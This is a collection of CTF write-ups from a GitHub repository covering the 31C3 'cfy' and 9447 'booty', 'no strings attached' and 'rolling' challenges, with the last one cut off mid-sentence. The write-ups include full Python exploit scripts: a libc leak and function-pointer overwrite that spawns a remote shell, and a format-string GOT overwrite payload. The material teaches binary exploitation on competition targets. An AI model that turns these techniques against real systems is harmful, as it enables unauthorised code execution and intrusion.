{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/31c3/cfy.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/31c3/cfy.md", "content": "### Solved by barrebas\n\nLet's have a look at 31C3's `cfy`. We're given the binary and a place to connect to. Upon connecting with `nc`, we see the following:\n\n```bash\nbas@tritonal:~/tmp/31c3$ nc 188.40.18.73 3313\nWhat do you want to do?\n0) parse from hex\n1) parse from dec\n2) parse from pointer\n3) quit\n```\n\nWith option 2, we have an arbitrary read ability, but we have to pass in the pointer in raw hex. This allows us to leak `libc` address from the got:\n\n```python\n#!/usr/bin/python\n\nimport struct \nimport time\nimport socket\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('188.40.18.73', 3313))\n\n\ndef p(x):\n    return struct.pack(\"L\", x)\n\naddr = 0x601020\n\npayload = \"\"\npayload += \"2\\n\"\npayload += p(addr)  # printf\npayload += \"\\n\"\n\nprint s.recv(1000)\ns.send(payload)\ntime.sleep(0.5)\nprint s.recv(1000)\n```\n\nGiven us the ouput:\n\n```bash\nbas@tritonal:~/tmp/31c3/cfy$ python read.py \nWhat do you want to do?\n0) parse from hex\n1) parse from dec\n2) parse from pointer\n3) quit\n\n\nPlease enter your number: dec: 140512731112416\nhex: 0x7fcbab6ca3e0\n\nWhat do you want to do?\n0) parse from hex\n1) parse from dec\n2) parse from pointer\n3) quit\n```\n\nUnfortunately, running the python script again shows a different output value. This means that ASLR is enabled. Furthermore, I didn't know what version of `libc` was running!\n\nI turned my attention to gaining code execution. This was more trivial, although it wasn't a straight-forward buffer overflow. The binary asks the user for a choice. That choice is converted from a string to an int. From this int, the binary looks up the relevant code to handle the request:\n\n\n```\n  4008af: 48 c1 e0 04           shl    rax,0x4         ; multiply value by 16\n  4008b3: 48 05 80 10 60 00     add    rax,0x601080    ; address of parsers, see below\n  4008b9: 48 8b 00              mov    rax,QWORD PTR [rax]\n  4008bc: bf e0 10 60 00        mov    edi,0x6010e0    ; address of buf, see below\n  4008c1: ff d0                 call   rax             ; gain code exec here!\n```\n\nThere is no check performed on the value in `rax`. If we pass in a normal value, like `2`, the binary fetches the corresponding parser here:\n\n```\ngdb-peda$ p parsers\n$1 = { {\n    fn = 0x40073d <from_hex>, \n    desc = 0x4009b4 \"parse from hex\"\n  }, {\n    fn = 0x400761 <from_dec>, \n    desc = 0x4009c3 \"parse from dec\"\n  }, {\n    fn = 0x400785 <from_ptr>, \n    desc = 0x4009d2 \"parse from pointer\"\n  } }\n```\n\nBut look here: `buf` is almost right behind `parsers`:\n\n```  \ngdb-peda$ x/40wx parsers\n0x601080 <parsers>:             0x0040073d  0x00000000  0x004009b4  0x00000000\n0x601090 <parsers+16>:          0x00400761  0x00000000  0x004009c3  0x00000000\n0x6010a0 <parsers+32>:          0x00400785  0x00000000  0x004009d2  0x00000000\n0x6010b0:                       0x00000000  0x00000000  0x00000000  0x00000000\n0x6010c0 <stdout@@GLIBC_2.2.5>: 0xf7dd77a0  0x00007fff  0xf7dd76c0  0x00007fff\n0x6010d0 <completed.6972>:      0x00000000  0x00000000  0x00000000  0x00000000\n0x6010e0 <buf>:                 0x00000000  0x00000000  0x00000000  0x00000000\n0x6010f0 <buf+16>:              0x00000000  0x00000000  0x00000000  0x00000000\n0x601100 <buf+32>:              0x00000000  0x00000000  0x00000000  0x00000000\n0x601110 <buf+48>:              0x00000000  0x00000000  0x00000000  0x00000000\n```\n\nIf we somehow load `buf` with pointers to code we want to execute, then pass in a large value at the prompt, the code will fetch the parser address from the `buf` section and we have control over execution:\n\n```bash\ngdb-peda$ r\nWhat do you want to do?\n0) parse from hex\n1) parse from dec\n2) parse from pointer\n3) quit\n7   # give bigger number!\n\nPlease enter your number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x6161616161616161 ('aaaaaaaa')\nRBX: 0x0 \nRCX: 0xfbad2288 \nRDX: 0x6010e0 ('a' <repeats 52 times>, \"\\n\")\nRSI: 0x7ffff7ff7035 --> 0x0 \nRDI: 0x6010e0 ('a' <repeats 52 times>, \"\\n\")\nRBP: 0x7fffffffe4b0 --> 0x0 \nRSP: 0x7fffffffe4a0 --> 0x7ffffe590 \n...snip...\n[-------------------------------------code-------------------------------------]\n   0x4008b3 <main+167>: add    rax,0x601080\n   0x4008b9 <main+173>: mov    rax,QWORD PTR [rax]\n   0x4008bc <main+176>: mov    edi,0x6010e0\n=> 0x4008c1 <main+181>: call   rax\n   0x4008c3 <main+183>: mov    QWORD PTR [rbp-0x8],rax\n   0x4008c7 <main+187>: mov    rax,QWORD PTR [rbp-0x8]\n   0x4008cb <main+191>: mov    rsi,rax\n   0x4008ce <main+194>: mov    edi,0x400a3d\nGuessed arguments:\narg[0]: 0x6010e0 ('a' <repeats 52 times>, \"\\n\")\n..snip...\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00000000004008c1 in main ()\n```\n\nExcellent. Now what pointer should we store in `buf`? I couldn't make a ROP chain, for I had no control over the stack. The obvious thing to do was to return to `system()` with `/bin/sh` as argument. But where was `system()` located?\n\nI had no idea what `libc` version was running. I did have an arbitrary read primitive though. I had downloaded `libc-2.19` and from the addresses of `printf` and `puts` (both available in the GOT) I deduced that this *wasn't* the correct version. However, I decided to scan the remote binary's libc for signature bytes of `system()`. I assumed it started with these bytes:\n\n```\nbas@tritonal:~/tmp/31c3/cfy$ gdb ./libc-2.19.so \nGNU gdb (GDB) 7.4.1-debian\n...snip...\ngdb-peda$ x/8b system\n0x46530 <system>:   0x48    0x85    0xff    0x74    0xb 0xe9    0x26    0xfb\n```\n\nSo I wrote a small scanner in python. This scanner will dump bytes from libc, searching for `ff85` in the output. \n\n```python\n#!/usr/bin/python\n\nimport struct, time, re\n\ndef p(x):\n    return struct.pack(\"L\", x)\n\npayload = \"\"\npayload += \"2\\n\"\npayload += p(0x601020)  # printf\npayload += \"\\n\"\n\nimport socket\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('188.40.18.73', 3313))\n\nprint s.recv(1025)\ns.send(payload)\ntime.sleep(1.5)\ndata = s.recv(1000)\n\nPRINTF = -1\nprint data\nm = re.search(r'hex: (.*)', data)\nif m:\n    PRINTF = m.group(1)\n\nOFFSET=63580    # guesstimated from real libc\nfor i in range(5000):\n    payload = \"\"\n    payload += \"2\\n\"\n    payload += p(int(PRINTF, 16)-OFFSET-i)\n    payload += \"\\n\"\n\n    s.send(payload)\n\n    data = s.recv(200)\n    print data\n    print i\n\n    if 'ff85' in data: # part of test rdi, rdi\n            print \"[!] found possible offset for system(): printf-%d\" % (int(PRINTF,16)-(int(PRINTF, 16)-OFFSET-i))\n            print \"[!] system @ %s\" % hex(int(PRINTF, 16)-OFFSET-i)\n            raw_input()\n```\n\nIt gave a lot of possible addresses, and once I thought I had `system()` but it was the wrong. I chose a reasonble offset to start from (based on libc 2.19) and ran the script. I stumbled upon the following output:\n\n```\n...snip...\n85\n[!] found possible offset for system(): printf-63665\n[!] system @ 0x7f4df0086b2f\n\n\nPlease enter your number: dec: 2803784840145881088\nhex: 0x26e90b74ff854800\n\nWhat do you want to do?\n0) parse from hex\n1) parse from dec\n2) parse from pointer\n3) quit\n\n86\n[!] found possible offset for system(): printf-63666\n[!] system @ 0x7f4df0086b2e\n```\n\nAt `printf-63665`, libc indeed has the first few bytes of `system()`. It started with a `00` byte, so I decreased the value by one and plugged that value into a script.\n\n\n```python\n#!/usr/bin/python\n\nimport struct, time, re, telnetlib, socket\n\ndef p(x):\n    return struct.pack(\"L\", x)\n\n# leak printf address in libc via GOT pointer\npayload = \"\"\npayload += \"2\\n\"\npayload += p(0x601020)  # printf@plt\npayload += \"\\n\"\n\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('188.40.18.73', 3313))\n\nprint s.recv(1025)\ns.send(payload)\ntime.sleep(0.5)\ndata = s.recv(1000)\n\nPRINTF = -1\nprint data\nm = re.search(r'hex: (.*)', data)\nif m:\n    PRINTF = m.group(1)\n\nprint \"[+] found printf: %x\" % int(PRINTF, 16)\nSYSTEM = int(PRINTF, 16) - 63664\nprint \"[+] system at %x\" % int(SYSTEM)\n\n# spam system into buf\npayload = \"\"\npayload += \"1\\n\"        \npayload += p(SYSTEM)    # address of system() will be stored in buf\npayload += p(SYSTEM)    # buf+8\npayload += p(SYSTEM)    # buf+16\npayload += \"\\n\"\n\ns.send(payload)\nprint s.recv(200)\n\npayload = \"\"\npayload += \"7\\n\"        # use an address further into buf (parsers+7*16)\npayload += \"/bin/sh\\n\"  # because this will overwrite the first few bytes\n\ns.send(payload)         # send payload, causing it to call system('/bin/sh')\n\nt = telnetlib.Telnet()  # interact with spawned shell\nt.sock = s\nt.interact()\n```\n\nI ran the script and crossed my fingers:\n\n```bash\nbas@tritonal:~/tmp/31c3/cfy$ python exploit.py \nWhat do you want to do?\n0) parse from hex\n1) parse from dec\n2) parse from pointer\n3) quit\n\n\nPlease enter your number: dec: 140686779126752\nhex: 0x7ff4317e93e0\n\nWhat do you want to do?\n0) parse from hex\n1) parse from dec\n2) parse from pointer\n3) quit\n\n[+] found printf: 7ff4317e93e0\n[+] system at 7ff4317d9b30\n\nPlease enter your number: \ndec: 0\nhex: 0x0\n\nWhat do you want to do?\n0) parse from hex\n1) parse from dec\n2) parse from pointer\n3) quit\n\nPlease enter your number: id\nuid=1001(cfy) gid=1001(cfy) groups=1001(cfy)\ncat /home/cfy/flag\nTHANK YOU WARIO!\n\nBUT OUR PRINCESS IS IN\nANOTHER CASTLE!\n\nLogin: cfy_pwn // 31C3_G0nna_keep<on>grynding\n```\n\nSo the flag was `31C3_G0nna_keep<on>grynding`. I thought this was quite tough based on the amount of points...\n\n", "timestamp": "2025-10-24T11:40:08.614773"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/9447/booty.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/9447/booty.md", "content": "### Solved by barrebas \n\n9447 CTF was ran the other day, and while I didn't have a lot of time, I managed to snatch a couple of flags. First one was this pirate-themed Binary Exploitation. \n\nThe binary present some kind of text-based arm-wrestling game. You can enter your name and then you have to fight several opponents. With no obvious buffer overflow / format string vulnerability (`%` characters are filtered and set to NULL) in sight, I focused on building a script that would win the game for me. After this, it was possible to change the name, and I was hoping a vulnerability would be present there. \n\nThe game is quite easy to beat: the next move of the opponent can be predicted from the message the game sends you. So if the output contained \"is looking exhausted\", the next move should be to \"[p]ush\". I whipped up some quick python to do this and which gives command back to the user when it detects that the game is finished. The binary itself was ran with `socat`:\n\n```bash\nbas@tritonal:~/tmp/9447$ socat TCP-LISTEN:7778,fork EXEC:./booty\n```\n\n```python\n#!/usr/bin/python\n\nfrom socket import *\nfrom time import sleep\nimport telnetlib, struct\n\ns=socket(AF_INET, SOCK_STREAM)\ns.connect(('localhost', 7778))\n\n# wait before continuing, allows attaching with gdb.\nraw_input()\n\n# receive banner\nprint s.recv(1024)\nsleep(0.01)\n\n# send name\ncmd =\"barrebas\"\ns.send(cmd+\"\\n\")\n\n# try to beat the game\nwhile 1:\n\tsleep(0.01)\n\n\tdata = s.recv(1024)\n\n\tprint data\n\t\n\t# proper responses\n\tif \"LEVEL\" in data:\n\t\tcmd = \"h\\n\"\n\tif \"exhausted\" in data:\n\t\tcmd = \"p\\n\"\n\tif \"flex\" in data:\n\t\tcmd = \"h\\n\"\n\tif \"tense\" in data:\n\t\tcmd = \"r\\n\"\n\t\t\n\t# we've won; hand over control\n\tif \"again\" in data:\n\t\tt = telnetlib.Telnet()\n\t\tt.sock = s\n\t\tt.interact()\n\t\t\n\t# game expects input, so send it\n\tif \">\" in data:\n\t\tif cmd:\n\t\t\ts.send(cmd)\n\t\t\tcmd = \"\"\ns.close()\n```\n\nThis allows us to win the game and gives us a \"clue\" as to where the treasure (flag) is. Furthermore, we can enter a new user name, but again, no obvious vulnerabilities. et0x noticed that once you send a shorter username, part of the previous username shows up. This can be seen below, as the new user name is not `KING` but `KINGebas`:\n\n```bash\n:: YOU WIN :: YE NOT BE WALKING THE PLANK YET!\n\n                      .ed\"\"\"\" \"\"\"$$$$be.\n                    -\"           ^\"\"**$$$e.\n                  .\"                   '$$$c\n                 /                      \"4$$b\n                d  3                     $$$$\n                $  *                   .$$$$$$\n               .$  ^c           $$$$$e$$$$$$$$.\n               d$L  4.         4$$$$$$$$$$$$$$b\n               $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$\n   e$\"\"=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$\n  z$$b. ^c     3$$$F \"$$$$b   $\"$$$$$$$  $$$$*\"      .=\"\"$c\n 4$$$$L   \\     $$P\"  \"$$b   .$ $$$$$...e$$        .=  e$$$.\n ^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$\n   \"**$$$ec   \"\\   %ce\"\"    $$$  $$$$$$$$$$*    .r\" =$$$$P\"\"\n         \"*$b.  \"c  *$e.    *** d$$$$$\"L$$    .d\"  e$$***\"\n\t\t\t^*$$c ^$c $$$      4J$$$$$% $$$ .e*\".eeP\"\n              \"$$$$$$\"'$=e....$*$$**$cz$$\" \"..d$*\"\n                \"*$$$  *=%4.$ L L$ P3$$$F $$$P\"\n                   \"$   \"%*ebJLzb$e$$$$$b $P\"\n                     %..      4$$$$$$$$$$ \"\n                      $$$e   z$$$$$$$$$$%\n                       \"*$c  \"$$$$$$$P\"\n                        .\"\"\"*$$$$$$$$bc\n                     .-\"    .$***$$$\"\"\"*e.\n                  .-\"    .e$\"     \"*$c  ^*b.\n           .=*\"\"\"\"    .e$*\"          \"*bc  \"*$e..\n         .$\"        .z*\"               ^*$e.   \"*****e.\n         $$ee$c   .d\"                     \"*$.        3.\n         ^*$E\")$..$\"                         *   .ee==d%\n            $.d$$$*                           *  J$$$e*\n             \"\"\"\"\"                             \"$$$\"\n\n\n:: HAIL THE NEW PIRATE KING, barrebas\n\n0xffdd1c3f marks the spot of your treasure!\n\nWould ye like to play again? (y / n):\n> \ny   \nPIRATE KING's be entitled to change their name:\n> > KING\n\nSTA:  62, STR: 10 :: KINGebas\nSTA: 104, STR: 18 :: Vengeful Queen Anne\n\nVengeful Queen Anne begins to flex their muscles.\n\nChoose an action, [p]ush  [h]old  [r]est:\n```\n\nI focused on the binary address, but as it turned out, the flag is not being read into the binary! I tried to break on `fopen`, and search the memory from within `gdb` for the flag that I planted locally... but nothing! Inspecting that memory address in `gdb` showed:\n\n```bash\n# bas@tritonal:~/tmp/9447$ gdb -pid `pgrep booty`\n...\nStopped reason: SIGINT\n0xf7757430 in __kernel_vsyscall ()\ngdb-peda$ x/10x 0xffdd1c3f\n0xffdd1c3f:\t0xdd1c9000\t0x000001ff\t0xdd1cd800\t0x048e51ff\n0xffdd1c4f:\t0xdd1c9008\t0x000001ff\t0xdd1d4800\t0x048796ff\n0xffdd1c5f:\t0x73d4e008\t0x0499def7\n```\n\nNothing there! No string, no flag, nothing! To be honest, I spent quite some time trying to figure out what I was doing wrong. I figured I was to blame and tried to read the address  that is returned after winning on the remote server. I hope the flag would be there. For this, I needed et0x's observation, because it allowed me to bypass the filtering of `%` characters. The binary filters the characters here:\n\n```\n 80488dd:\t80 7a ff 25          \tcmpb   $0x25,-0x1(%edx)\n 80488e1:\t74 0d                \tje     80488f0 <vfprintf@plt+0x380>\n 80488e3:\t39 c2                \tcmp    %eax,%edx\n 80488e5:\t75 f1                \tjne    80488d8 <vfprintf@plt+0x36\n```\n\nIf it encounters a `%`, it will stop and set that byte to NULL. However, if we supply a new username that is shorter than the previous one, the program will only check len(username) bytes for `%` characters. If we supply:\n\n```\n%aa%x%x\n```\n\nas the first user name and then \n\n```\nbb\n```\n\nThen the new username will be `bba%x%x`. All we have to do then is to beat the game once more, so the format string is triggered. That is because the string `:: HAIL THE NEW PIRATE KING, ` is printed separately from the username, which is printed with something like `print(username)`. \n\nI did all this to print the string at the memory address that is given by the binary... to no avail. The final piece of the puzzle was the `fopen` call that opens the file `/home/booty/flag`:\n\n```bash\n 80487c0:\t53                   \tpush   %ebx\n 80487c1:\t83 ec 10             \tsub    $0x10,%esp\n 80487c4:\t68 60 9a 04 08       \tpush   $0x8049a60\t# 'r'\n 80487c9:\t68 61 98 04 08       \tpush   $0x8049861\t# \"/home/booty/flag\"\n 80487ce:\te8 6d fd ff ff       \tcall   8048540 <fopen@plt>\n 80487d3:\t83 c4 10             \tadd    $0x10,%esp\n 80487d6:\t85 c0                \ttest   %eax,%eax\n 80487d8:\t89 c3                \tmov    %eax,%ebx\n 80487da:\t75 19                \tjne    80487f5 <vfprintf@plt+0x285>\n 80487dc:\teb 33                \tjmp    8048811 <vfprintf@plt+0x2a1>\n 80487de:\t66 90                \txchg   %ax,%ax\n 80487e0:\t83 ec 08             \tsub    $0x8,%esp\n 80487e3:\t0f be d0             \tmovsbl %al,%edx\n 80487e6:\tff 35 a4 a1 04 08    \tpushl  0x804a1a4\n 80487ec:\t52                   \tpush   %edx\n 80487ed:\te8 fe fc ff ff       \tcall   80484f0 <_IO_putc@plt>\n 80487f2:\t83 c4 10             \tadd    $0x10,%esp\n 80487f5:\t83 ec 0c             \tsub    $0xc,%esp\n 80487f8:\t53                   \tpush   %ebx\n 80487f9:\te8 e2 fc ff ff       \tcall   80484e0 <_IO_getc@plt>\n 80487fe:\t83 c4 10             \tadd    $0x10,%esp\n 8048801:\t3c ff                \tcmp    $0xff,%al\n 8048803:\t75 db                \tjne    80487e0 <vfprintf@plt+0x270>\n 8048805:\t83 ec 0c             \tsub    $0xc,%esp\n 8048808:\t53                   \tpush   %ebx\n 8048809:\te8 b2 fc ff ff       \tcall   80484c0 <fclose@plt>\n 804880e:\t83 c4 10             \tadd    $0x10,%esp\n 8048811:\t83 ec 0c             \tsub    $0xc,%esp\n 8048814:\t6a 00                \tpush   $0x0\n 8048816:\te8 f5 fc ff ff       \tcall   8048510 <exit@plt>\n```\n\nIt seems like this function is never called, yet it does open the flag and spits out the contents. I verified this from within `gdb` by running `set $eip=0x80487c0` and then continuing execution. Indeed, it spat out the bogus flag of my local system. I leveraged the string format vulnerability to overwrite a got pointer force the binary to execute that function. I chose to overwrite `vfprintf`, because that's called a lot by the binary. I needed to overwrite this pointer in two steps. First, the lower two bytes are overwritten with `0x87c0`. Then the higher two bytes are overwritten with `0x0804`. When the binary then wants to call `vfprintf`, code execution is redirected to `0x80487c0`!\n\nThe exploit now sends the first username: `cmd =\"%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n\"`. This contains the `%` character and the rest of the format string. I found the proper offset for the direct addressing (`%36$hn`) simply by trying a few values together with a name that contained \"AAAABBBBCCCC\" blocks. The rest of the padding (`%34719c` for instance) is simply by running `gdb` and taking note of the address where the binary crashes. Adding the right amount of padding, observing the crash again, etc.\n\nThe final exploit:\n\n```python\n#!/usr/bin/python\n\nfrom socket import *\nfrom time import sleep\nimport telnetlib, struct\n\ns=socket(AF_INET, SOCK_STREAM)\ns.connect(('localhost', 7778))\n\n# wait before continuing, allows attaching with gdb.\nraw_input()\n\n# receive banner\nprint s.recv(1024)\nsleep(0.01)\n\n# send string format name\ncmd =\"%AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%34719c%36$hn%32836c%37$n\"\n\ns.send(cmd+\"\\n\")\n\n# try to beat the game\nwhile 1:\n\tsleep(0.01)\n\n\tdata = s.recv(1024)\n\n\tprint data\n\t\n\t# proper responses\n\tif \"LEVEL\" in data:\n\t\tcmd = \"h\\n\"\n\tif \"exhausted\" in data:\n\t\tcmd = \"p\\n\"\n\tif \"flex\" in data:\n\t\tcmd = \"h\\n\"\n\tif \"tense\" in data:\n\t\tcmd = \"r\\n\"\n\t\t\n\t# we've won; update name to activate string format bug\n\tif \"again\" in data:\n\t\t# 0x804a138: vfprintf@got.plt\n\t\t# we overwrite it in two parts, the first uses %hn to write two bytes to the lower part of the address\n\t\t# the second %n overwrites four bytes, but I don't really care.\n\t\t# the rest of the string format bug is: \"%34719c%36$hn%32836c%37$n\"\n\t\tcmd = \"ya0AAAAAAAAAAAAAAAAAAAAAAA\" + struct.pack(\"<L\", 0x804a138) + struct.pack(\"<L\", 0x804a13a) + \"\\n\"\n\t\n\t# flag is in the input, so halt execution & take note of it!\n\tif \"9447\" in data:\n\t\traw_input()\n\t\t\n\t# game expects input, so send it\n\tif \">\" in data:\n\t\tif cmd:\n\t\t\ts.send(cmd)\n\t\t\tcmd = \"\"\ns.close()\n```\n\nThe real flag was something like `9447{YOHOHO_A_PIRATES_LIFE_FOR_ME}`. \n", "timestamp": "2025-10-24T11:40:08.919870"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/9447/no-strings-attached.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/9447/no-strings-attached.md", "content": "### Solved by bitvijays, with special thanks to barrebas\n\nIn this challenge you are provided with a 32 bit binary, which when executed asks for a password:\n```\nroot@kali:~# ./no_strings_attached \nWelcome to cyber malware control software.\nCurrently tracking 742475483 bots worldwide\nPlease enter authentication details:\n```\n\nIf you enter the wrong details: Access Denied message is displayed.\n\nFirst step is to solve this is to decompile this binary using <a href=\"http://decompiler.fit.vutbr.cz/decompilation-run/\">Online Decompiler</a>.\n\nIf you see the below decompiled code, main function calls the authenticate function, which has wcscmp() function (which compares two strings). wcscmp is a wide character byte version of strcmp. If you further check the next line, it checks for variable g1 value based on which program prints Success or Access Denied.\n\n\n\n``` C\n/* -------- Function Prototypes --------- */\n//Showing only authenticate and main functions\nint32_t banner(void);\nint32_t prompt_authentication(void);\nint32_t decrypt(int32_t * a1, int32_t * a2);\nint32_t authenticate(void);\n\nint32_t authenticate(void) {\n    int32_t * v1 = (int32_t *)decrypt((int32_t *)\"\\x3A\\x14\", (int32_t *)\"\\x01\\x14\"); // bp-16\n    g1 = 3;\n    fgetws();\n    int32_t result; // 0x804879c\n    if (g1 == 0) {\n        // 0x804879c\n        result = *v1;\n        free((int32_t *)result);\n        return result;\n    }\n    // 0x804874b\n    int8_t * wstr;\n    wcslen(wstr);\n    g1 = *v1;\n    wcscmp();\n    if (g1 == 0) {\n        // 0x8048780\n        g1 = 0x8048b44;\n        wprintf(\"Success! Welcome back!\\n\");\n        // branch -> 0x804879c\n    } else {\n        // 0x804878f\n        g1 = 0x8048ba4;\n        wprintf(\"Access denied!\\n\");\n        // branch -> 0x804879c\n    }\n    // 0x804879c\n    result = *v1;\n    free((int32_t *)result);\n    return result;\n}\n\nint main(int argc, char ** argv) {\n    // bb\n    setlocale(LC_ALL, \"\");\n    banner();\n    prompt_authentication();\n    authenticate();\n    return 0;\n}\n```\n\nNext, if we use gdb-peda to debug this binary and put a breakpoint on wcscmp function.\n```\nroot@kali:~# gdb -q ./no_strings_attached \nReading symbols from /root/no_strings_attached...(no debugging symbols found)...done.\ngdb-peda$ pdisass authenticate\nDump of assembler code for function authenticate:\n**snip**\n   0x0804876a <+98>:\tmov    DWORD PTR [esp+0x4],eax\n   0x0804876e <+102>:\tlea    eax,[ebp-0x800c]\n   0x08048774 <+108>:\tmov    DWORD PTR [esp],eax\n   0x08048777 <+111>:\tcall   0x80484d0 <wcscmp@plt>\n   0x0804877c <+116>:\ttest   eax,eax\n   0x0804879f <+151>:\tmov    DWORD PTR [esp],eax\n   0x080487a2 <+154>:\tcall   0x8048480 <free@plt>\n   0x080487a7 <+159>:\tleave  \n   0x080487a8 <+160>:\tret    \nEnd of assembler dump.\ngdb-peda$ br *authenticate + 111\nBreakpoint 1 at 0x8048777\ngdb-peda$ \n```\nWhen the control reaches the breakpoint, gdb-peda guesses the two arguments arg[0] and arg[1] for wcscmp function. As, we typed the password hello, we can see that arg[1] must be the original password. If we extract the memory by command \"dump memory file_name start_address end_address\" we would be able to get the password which is the flag.\n```\ngdb-peda$ run\nWelcome to cyber malware control software.\nCurrently tracking 2102520441 bots worldwide\nPlease enter authentication details: hello\n[----------------------------------registers-----------------------------------]\nEAX: 0xbfff74bc --> 0x68 ('h')\nEBX: 0xb7fc1ff4 --> 0x160d7c \nECX: 0xbfff74bc --> 0x68 ('h')\nEDX: 0x3 \nESI: 0x0 \nEDI: 0x0 \nEBP: 0xbffff4c8 --> 0xbffff4e8 --> 0xbffff568 --> 0x0 \nESP: 0xbfff74a0 --> 0xbfff74bc --> 0x68 ('h')\nEIP: 0x8048777 (<authenticate+111>:\tcall   0x80484d0 <wcscmp@plt>)\nEFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x804876a <authenticate+98>:\tmov    DWORD PTR [esp+0x4],eax\n   0x804876e <authenticate+102>:\tlea    eax,[ebp-0x800c]\n   0x8048774 <authenticate+108>:\tmov    DWORD PTR [esp],eax\n=> 0x8048777 <authenticate+111>:\tcall   0x80484d0 <wcscmp@plt>\n   0x804877c <authenticate+116>:\ttest   eax,eax\n   0x804877e <authenticate+118>:\tjne    0x804878f <authenticate+135>\n   0x8048780 <authenticate+120>:\tmov    eax,0x8048b44\n   0x8048785 <authenticate+125>:\tmov    DWORD PTR [esp],eax\nGuessed arguments:\narg[0]: 0xbfff74bc --> 0x68 ('h')\narg[1]: 0x804cba0 --> 0x39 ('9')\n[------------------------------------stack-------------------------------------]\n0000| 0xbfff74a0 --> 0xbfff74bc --> 0x68 ('h')\n0004| 0xbfff74a4 --> 0x804cba0 --> 0x39 ('9')\n0008| 0xbfff74a8 --> 0xb7fc2440 --> 0xfbad2288 \n0012| 0xbfff74ac --> 0x0 \n0016| 0xbfff74b0 --> 0x0 \n0020| 0xbfff74b4 --> 0x0 \n0024| 0xbfff74b8 --> 0x0 \n0028| 0xbfff74bc --> 0x68 ('h')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 1, 0x08048777 in authenticate ()\ngdb-peda$ dump memory file 0x804cba0 0x805cba0\ngdb-peda$ cat file\n9447{you_are_an_international_mystery}gdb-peda$\n```\n\n**The flag is 9447{you_are_an_international_mystery}**.\n", "timestamp": "2025-10-24T11:40:08.988548"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/9447/rolling.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/9447/rolling.md", "content": "### Solved by barrebas\n\nThe last flag for 9447 CTF that I got was this binary reversing challenge. Let's get `rolling`!\n\nIdentifying the binary with file showed that it was a 64-bit ELF, dynamically linked. Unfortunately for me, it was linked against a higher `libc` version:\n\n```bash\nbas@tritonal:~/tmp/9447$ ./rolling \n./rolling: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.14' not found (required by ./rolling)\n```\nTo solve this issue, I needed a way to get the program to use a newer version of libc. One way to do this is using `LD_PRELOAD`. I downloaded a [newer libc deb](http://pkgs.org/ubuntu-14.10/ubuntu-main-amd64/libc6_2.19-10ubuntu2_amd64.deb.html), that ought to be binary compatible with my debian box. After unpacking `ld-2.19.so` and `libc-2.19.so`, I could start the binary like this:\n\n```bash\nbas@tritonal:~/tmp/9447$ LD_PRELOAD=./libc-2.19.so ./ld-2.19.so ./rolling\nFynd i mewn i cyfrinair\n```\n\nAnd in `gdb`:\n\n```bash\ngdb-peda$ set environment LD_PRELOAD=./libc-2.19.so ./ld-2.19.so\ngdb-peda$ r\nFynd i mewn i cyfrinair\n\nProgram received signal SIGSEGV, Segmentation fault.\n<snip>\n```\n\nThe program would still segfault, but at least it ran. Okay, let's get to work. The strange string meant nothing to me, but it's Welsh for \"Enter a password\". Of course, the description on 9447 mentioned that the binary would take an input. The flag is the input which the binary accepts. I ran the binary with an argument, which resulted in another Welsh string. `strings` identified the last Welsh string. I looked up their meaning via Google Translate and their address in `gdb`:\n\n```bash\nNac oes. Ceisiwch eto. == No. Try again. // rolling : 0x600865 (\"Nac oes. Ceisiwch eto.\")\nLlongyfarchiadau == Congratulations // rolling : 0x600854 (\"Llongyfarchiadau\")\n```\n\nThese strings look like the \"Good\"/\"Bad\" output that we expect for this input-checking binary! Switching over to the output of `objdump`, I looked up where these strings are referenced:\n\n```bash\n  400771:\t48 8b 55 f0          \tmov    -0x10(%rbp),%rdx\n  400775:\t48 83 c2 08          \tadd    $0x8,%rdx\n  400779:\t48 8b 12             \tmov    (%rdx),%rdx\n  40077c:\t48 89 d7             \tmov    %rdx,%rdi\n  40077f:\tff d0                \tcallq  *%rax\t\t# interesting function\n  400781:\t85 c0                \ttest   %eax,%eax\t# if eax == 1 -> success\n  400783:\t74 0c                \tje     400791 <memcpy@plt+0x2b1>\n  400785:\tbf 54 08 40 00       \tmov    $0x400854,%edi\t\t\t\t# Llong...\n  40078a:\te8 11 fd ff ff       \tcallq  4004a0 <puts@plt>\n  40078f:\teb 16                \tjmp    4007a7 <memcpy@plt+0x2c7>\n  400791:\tbf 65 08 40 00       \tmov    $0x400865,%edi\t\t\t\t# Nac oes... \n  400796:\te8 05 fd ff ff       \tcallq  4004a0 <puts@plt>\n  40079b:\teb 0a                \tjmp    4007a7 <memcpy@plt+0x2c7>\n  40079d:\tbf 7c 08 40 00       \tmov    $0x40087c,%edi\n  4007a2:\te8 f9 fc ff ff       \tcallq  4004a0 <puts@plt>\n  4007a7:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  4007ac:\tc9                   \tleaveq \n  4007ad:\tc3                   \tretq  \n```\n\nThe `test eax, eax` at `0x400781` controls which path is taken: either OK (\"Llong...\") or not OK (\"Nac oes...\"). The value of `eax` is probably set by the function that is called at `0x40077f: callq  *%rax`. Switching back to `gdb`, I set a breakpoint on `0x40077f` and prepared to trace 